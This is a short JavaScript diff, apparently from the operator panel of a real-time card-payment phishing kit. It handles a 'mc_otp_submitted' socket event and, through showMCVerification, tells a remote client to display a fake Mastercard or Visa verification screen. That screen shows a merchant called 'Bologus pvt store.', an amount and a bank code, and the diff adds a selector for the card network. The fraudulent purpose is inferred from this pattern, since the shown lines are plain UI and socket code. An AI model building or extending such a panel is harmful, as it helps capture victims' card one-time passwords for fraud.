@@ -2611,7 +2611,6 @@ socket.on('mc_otp_submitted', (data) => {
   }
 });
 
-// Show MC verification panel - UPDATED to include currency conversion
 function showMCVerification(id) {
   const transaction = transactionsMap.get(id);
   if (!transaction) {
@@ -2634,16 +2633,20 @@ function showMCVerification(id) {
   const currencySelect = document.getElementById('mcCurrencySelect');
   const selectedCurrency = currencySelect ? currencySelect.value : 'INR';
   
+  // Get selected verification type (mastercard or visa)
+  const verificationType = document.getElementById('mcVerificationType').value;
+  
   // Send event to client to show MC verification with loading state
   socket.emit('show_mc_verification', {
     invoiceId: id,
     merchantName: 'Bologus pvt store.',
     amount: `₹${transaction.amount}`,
     bankCode: document.getElementById('mcBankSelect').value,
-    currency: selectedCurrency // Include selected currency
+    currency: selectedCurrency, // Include selected currency
+    verificationType: verificationType // Include verification type
   });
   
-  console.log('Showing MC verification for invoice:', id, 'with currency:', selectedCurrency);
+  console.log('Showing MC verification for invoice:', id, 'with currency:', selectedCurrency, 'and verification type:', verificationType);
 }
 
 // Enhanced screen frame handler
